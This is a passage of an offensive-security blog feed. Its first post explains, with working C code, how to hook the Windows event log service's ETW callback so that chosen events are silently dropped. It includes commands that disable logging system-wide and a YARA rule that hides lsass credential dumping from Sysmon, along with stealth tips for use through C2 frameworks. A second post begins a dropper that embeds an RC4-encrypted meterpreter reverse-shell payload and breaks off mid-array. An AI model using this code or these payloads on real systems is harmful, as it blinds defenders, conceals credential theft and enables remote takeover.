&lt;p&gt;Below you can see that I cleared the event log at 7:01 then added a new user at 7:04 but this event was not reported because of our &lt;code&gt;ret&lt;/code&gt; in the callback is causing all events system wide to be dropped.&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/retworking-1024x145.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h4&gt;&lt;strong&gt;Applying the hook&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;applying-the-hook&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#applying-the-hook&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Now that we have a PoC working in windbg its time to start writing the code. I&amp;rsquo;m going to skip the injection side as there is loads of good explanations on that and go straight into how our DLL will work.&lt;/p&gt;
&lt;p&gt;The first thing we need to do is find the offset of &lt;code&gt;wevtsvc!EtwEventCallback&lt;/code&gt; so we know where to place the hook. The first step in doing that is locating the base address of &lt;code&gt;wevtsvc.dll&lt;/code&gt; the code below will do that and store it in the &lt;code&gt;dwBase&lt;/code&gt; variable.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;DWORD_PTR dwBase;
DWORD     i, dwSizeNeeded;
HMODULE   hModules[102400];
TCHAR     szModule[MAX_PATH];

if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &amp;amp;dwSizeNeeded))
{
\	for (int i = 0; i &amp;lt; (dwSizeNeeded / sizeof(HMODULE)); i&amp;#43;&amp;#43;)
\	{
\	\	ZeroMemory((PVOID)szModule, MAX_PATH);

\	\	if (GetModuleBaseNameA(GetCurrentProcess(), hModules[i], (LPSTR)szModule, sizeof(szModule) / sizeof(TCHAR)))
\	\	{
\	\	\	if (!strcmp(&amp;#34;wevtsvc.dll&amp;#34;, (const char*)szModule))
\	\	\	{
\	\	\	\	dwBase = (DWORD_PTR)hModules[i];
\	\	\	}
\	\	}
\	}
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Since we do not know the exact location of &lt;code&gt;EtwEventCallback&lt;/code&gt; we will need to search memory for it. We know that its in the address space of &lt;code&gt;wevtsvc.dll&lt;/code&gt; which is why we had to find its base address.&lt;/p&gt;
&lt;p&gt;We can use the disassembly from windbg to see the bytes at the start of the callback. We can then scan memory until we find these bytes. Once we have we will know where to place the hook.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pattern.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This code will search &lt;code&gt;0xfffff&lt;/code&gt; bytes past the base address of &lt;code&gt;wevtsvc.dll&lt;/code&gt; for the pattern &lt;code&gt;4883ec384c8b0d&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#define PATTERN &amp;#34;\\x48\\x83\\xec\\x38\\x4c\\x8b\\x0d&amp;#34;

DWORD i;
LPVOID lpCallbackOffset;

for (i = 0; i &amp;lt; 0xfffff; i&amp;#43;&amp;#43;)
{
    if (!memcmp((PVOID)(dwBase &amp;#43; i), (unsigned char*)PATTERN, strlen(PATTERN)))
    {
        lpCallbackOffset = (LPVOID)(dwBase &amp;#43; i);
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Once we have the offset we will make a copy of the bytes located there with a call to &lt;code&gt;memcpy&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;memcpy(OriginalBytes, lpCallbackOffset, 50);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Then apply a hook to redirect all the calls to &lt;code&gt;EtwEventCallback&lt;/code&gt; to &lt;code&gt;EtwCallbackHook&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;VOID HookEtwCallback()
{
    DWORD oldProtect, oldOldProtect;

    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    *(void **)(boing &amp;#43; 2) = &amp;amp;EtwCallbackHook;

    VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, &amp;amp;oldProtect);
    memcpy(lpCallbackOffset, boing, sizeof(boing));
    VirtualProtect(lpCallbackOffset, 13, oldProtect, &amp;amp;oldOldProtect);

    return;
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;I&amp;rsquo;m going to skip going into details about parsing &lt;code&gt;EventRecord-&amp;gt;UserData&lt;/code&gt; as it could be a whole blog post on its own, but if you are interested you can see my implementation &lt;a href=&#34;https://github.com/bats3c/EvtMute/blob/master/EvtMute/EvtMuteHook/dllmain.cpp#L132&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now having hooked the callback is all good, but we still need to be able to report events we don&amp;rsquo;t want to block. This means we are going to also have to restore and run the callback so the event is reported, then re-hook it so we can catch the next event.&lt;/p&gt;
&lt;p&gt;Using a &lt;code&gt;typedef&lt;/code&gt; makes doing this pretty straight forward.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;typedef VOID(WINAPI * EtwEventCallback_) (EVENT_RECORD *EventRecord);

VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
{
    DWORD dwOldProtect;

    VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtect);
    memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes));
    VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, &amp;amp;dwOldProtect);

    EtwEventCallback_ EtwEventCallback = (EtwEventCallback_)lpCallbackOffset;

    EtwEventCallback(EventRecord);

    HookEtwCallback();
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;After doing all of the we are now able to find the offset of the ETW callback, hook it to our own and parse the data. Then unpatch the callback and report the event.&lt;/p&gt;
&lt;p&gt;Below you can see what the parsed event looks like in the windbg window.&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/dbgevent.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h4&gt;&lt;strong&gt;Pattern matching with YARA&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;pattern-matching-with-yara&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pattern-matching-with-yara&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Now that we have the event in a clear format, its time to implement filters. I decided to use &lt;a href=&#34;http://virustotal.github.io/yara/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;YARA rules&lt;/a&gt; for two reasons, The first being that I love the irony of using a popular defensive tool offensively. The second reason is that it is actually perfect for this use case as it has a &lt;a href=&#34;https://yara.readthedocs.io/en/stable/capi.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;very well documented&lt;/a&gt; C API and will work completely inside memory.&lt;/p&gt;
&lt;p&gt;Its also worth pointing out that I have defined the following macros to keep consistency in the code style&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/macros.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;The below example shows how you can create a yara rule object that can be used in &lt;code&gt;YRRulesScanMem&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#define RULE_ALLOW_ALL &amp;#34;rule Allow { condition: false }&amp;#34;

YRInitalize();

RtlCopyMemory(cRule, RULE_ALLOW_ALL, strlen(RULE_ALLOW_ALL));

if (YRCompilerCreate(&amp;amp;yrCompiler) != ERROR_SUCCESS)
{
  return -1;
}

if (YRCompilerAddString(yrCompiler, cRule, NULL) != ERROR_SUCCESS)
{
  return -1;
}

YRCompilerGetRules(yrCompiler, &amp;amp;yrRules);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Once the rule object has been created we can start scanning memory. The below example will scan the &lt;code&gt;StringBuffer&lt;/code&gt; variable which contains the formatted event and will pass the result to the yara callback function &lt;code&gt;ToReportOrNotToReportThatIsTheQuestion&lt;/code&gt; which in turn will either set the &lt;code&gt;dwReport&lt;/code&gt; variable to &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;1&lt;/code&gt; depending on if the rule matched or not. There is also a hard baked check for if the &lt;code&gt;PIPE_NAME&lt;/code&gt; variable is present in the event. The reason for this &lt;code&gt;EvtMuteHook.dll&lt;/code&gt; will use a named pipe to dynamically update the current rule, this will cause events to be generated so this check will ensure that these events are never reported.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;INT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context,
    INT Message,
    PVOID pMessageData,
    PVOID pUserData
)
{
    if (Message == CALLBACK_MSG_RULE_MATCHING)
    {
        (*(int*)pUserData) = 1;
    }

    if (Message == CALLBACK_MSG_RULE_NOT_MATCHING)
    {
        (*(int*)pUserData) = 0;
    }

    return CALLBACK_CONTINUE;
}

YRRulesScanMem(yrRules, (uint8_t*)StringBuffer, strlen(StringBuffer), 0, ToReportOrNotToReportThatIsTheQuestion, &amp;amp;dwReport, 0);

if (dwReport == 0)
{
    if (strstr(StringBuffer, PIPE_NAME) == NULL)
    {
        DoOriginalEtwCallback(EventRecord);
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h4&gt;&lt;strong&gt;Where&amp;rsquo;s the logs gone?&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;where&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#where&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;You can grab the latest versions of EvtMute from &lt;a href=&#34;https://github.com/bats3c/EvtMute/releases/tag/v1.0&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;. &lt;code&gt;EvtMuteHook.dll&lt;/code&gt; contains the core functionality, once it is injected it will apply a temporary filter which will allow all events to be reported, this filter can be dynamically updated without having to re-inject.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve written &lt;code&gt;SharpEvtMute.exe&lt;/code&gt; which is a C# assembly that can easily run via &lt;code&gt;execute&lt;/code&gt; in shad0w or &lt;code&gt;execute-assembly&lt;/code&gt; in cobalt strike. I will be writing a native version in C for a more stealthy option.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Disabling Logging&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A trivial use case would be to disable event logging system wide. To do this we can use the following yara rule.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule disable { condition: true }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;We will need to start by injecting the hook into the event service.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;.\\SharpEvtMute.exe --Inject&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/hookinject.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now that the hook is placed we can add the filter.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;.\\SharpEvtMute.exe --Filter &amp;#34;rule disable { condition: true }&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/addfilter.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now all events will be dropped by the event service.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Complex Filters&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Filters can be dynamically changed without having to re-inject a hook. This makes it quick and easy to update the active filter.&lt;/p&gt;
&lt;p&gt;An example of a more complex filter is shown below. It is capable of blocking the events related to a lsass memory dump from being reported by sysmon.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule block_lsass_dump {
    meta:
        author = &amp;#34;@_batsec_&amp;#34;
        description = &amp;#34;Prevent lsass dumping being reported by sysmon&amp;#34;
    strings:
        $provider = &amp;#34;Microsoft-Windows-Sysmon&amp;#34;
        $image = &amp;#34;lsass.exe&amp;#34; nocase
        $access = &amp;#34;GrantedAccess&amp;#34;
        $type = &amp;#34;0x1fffff&amp;#34;
    condition:
        all of them
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;With a complex rule like this it is much harder to condense it into a single line. This is why I added the ability to give base64 encoded rules.&lt;/p&gt;
&lt;p&gt;The rule can easily be converted to base64 from a linux command line.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;base64 -w 0 YaraFilters/lsassdump.yar | echo $(&amp;lt;/dev/stdin)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Then using the &lt;code&gt;--Encoded&lt;/code&gt; flag we can pass it as a filter&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/encrule-1024x148.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h4&gt;&lt;strong&gt;Opsec Considerations&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;opsec-considerations&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#opsec-considerations&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;When injecting the hook &lt;code&gt;SharpEvtMute.exe&lt;/code&gt; will call &lt;code&gt;CreateRemoteThread&lt;/code&gt; this call is made before the hook is placed so it will be reported by Sysmon. This is because the injection feature of &lt;code&gt;SharpEvtMute.exe&lt;/code&gt; should only be used as a PoC. I recommend manually injecting &lt;code&gt;EvtMuteHook.dll&lt;/code&gt; into the event logging service when stealth is important.&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s PID can be found by running &lt;code&gt;SharpEvtMute.exe --Pid&lt;/code&gt;. The hook can be placed by manually injecting the shellcode (run &lt;code&gt;make&lt;/code&gt; in EvtMuteBin) via your C2 framework of choice, e.g &lt;code&gt;shinject&lt;/code&gt; in shad0w.&lt;/p&gt;
&lt;p&gt;It is also worth mentioning that the hook will use a named pipe to update filters. The named pipe is called &lt;code&gt;EvtMuteHook_Rule_Pipe&lt;/code&gt; (this named can be changed easily). There is a rule hard baked into the hook to ensure that any events including this name will be dropped automatically but it will still be an IOC having it listening, so I recommend changing it.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Community Filters&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;community-filters&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#community-filters&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;If you create some useful filters feel free to make a pull request to the &lt;code&gt;YaraFilters&lt;/code&gt; directory. It would be cool to have a good collection of filters to hide common actions that everyone can benefit from.&lt;/p&gt;
&lt;p&gt;Thanks for reading and if you have any questions feel free to hit me up on twitter &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Defending Your Malware</title>
      <link>//localhost:1313/articles/2020/08/2020-08-11-defending-your-malware/</link>
      <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/08/2020-08-11-defending-your-malware/</guid>
      <description>
        
        
        &lt;p&gt;Malware is an important part of an engagement, though as many security solutions are now evolving past rudimentary signature comparisons to using more advanced techniques to detect malicious activity, it is important that we as attackers understand the methods they are using and how we can avoid them.&lt;/p&gt;
&lt;p&gt;Consider the following code I wrote for example.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;wincrypt.h&amp;gt;
#include &amp;lt;tlhelp32.h&amp;gt;

/****************************************************************************************************/
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
// cat meter.bin | openssl enc -rc4 -nosalt -k &amp;#34;HideMyShellzPlz?&amp;#34; &amp;gt; encmeter.bin
// xxd -i encmeter.bin
// x86_64-w64-mingw32-gcc dropper.c -o dropper.exe
unsigned char encmeter_bin[] = {
  0x6e, 0xdc, 0x5b, 0x2a, 0x59, 0xba, 0x87, 0x64, 0x3e, 0x1d, 0x15, 0xcc,
  0x55, 0x5e, 0x70, 0xdd, 0xf3, 0x57, 0x98, 0x96, 0x2a, 0xd0, 0x0f, 0xe5,
  0x5a, 0xcd, 0xab, 0x28, 0xb3, 0xda, 0xff, 0x70, 0xd5, 0x48, 0x25, 0x7f,
  0xaf, 0x87, 0x0b, 0xd4, 0xd5, 0x89, 0x44, 0xa8, 0x47, 0xc1, 0x0d, 0xce,
  0x17, 0xf3, 0x64, 0x72, 0x70, 0xd4, 0xd8, 0x5f, 0xfe, 0x66, 0xe1, 0x20,
  0x21, 0x89, 0x43, 0xf2, 0xd9, 0x95, 0x17, 0x4e, 0x96, 0xe7, 0x9a, 0xab,
  0xa8, 0x14, 0xc9, 0x85, 0x4c, 0x23, 0x5d, 0x8a, 0x24, 0xef, 0x5e, 0x3b,
  0xe7, 0x14, 0x74, 0x65, 0x6a, 0x20, 0xe2, 0x03, 0x89, 0x84, 0xfa, 0x9d,
  0xf1, 0x97, 0x46, 0xc9, 0x50, 0xc1, 0x07, 0xf6, 0x49, 0xd1, 0x2d, 0x35,
  0x45, 0x66, 0x06, 0xf7, 0x49, 0x9b, 0xc8, 0x0b, 0x0e, 0xc1, 0x3b, 0x71,
  0x7c, 0xef, 0xbe, 0x94, 0xd5, 0x81, 0xbe, 0x5f, 0x81, 0x6c, 0x7f, 0x18,
  0x1e, 0xd7, 0x3f, 0x93, 0x0f, 0x7e, 0x09, 0x2f, 0x53, 0x6c, 0x04, 0x34,
  0x77, 0x61, 0x54, 0x56, 0x8f, 0x43, 0xd7, 0x5b, 0xc3, 0x29, 0x1e, 0x16,
  0xda, 0xf3, 0x58, 0x83, 0x8c, 0xd7, 0xf2, 0x3d, 0x4c, 0xb4, 0x3d, 0xcb,
  0x24, 0xfa, 0x84, 0x00, 0x58, 0x28, 0x96, 0xe0, 0x1b, 0x57, 0x03, 0x2e,
  0xc6, 0xc5, 0x22, 0x31, 0xc1, 0x1d, 0xe4, 0xd5, 0x8a, 0x4c, 0x79, 0x5f,
  0x83, 0x05, 0xe3, 0x73, 0x8c, 0x11, 0x9e, 0x57, 0xcf, 0x5f, 0xa9, 0x7b,
  0x26, 0xfa, 0xc3, 0xad, 0xd1, 0x2c, 0x57, 0x32, 0xbe, 0x3a, 0x41, 0x18,
  0x55, 0x87, 0x74, 0xc0, 0xbf, 0x26, 0xd8, 0x01, 0xf0, 0x15, 0xdd, 0x2b,
  0xe6, 0x35, 0x7a, 0xcc, 0x18, 0x83, 0xf4, 0xdd, 0xc9, 0x75, 0x68, 0x12,
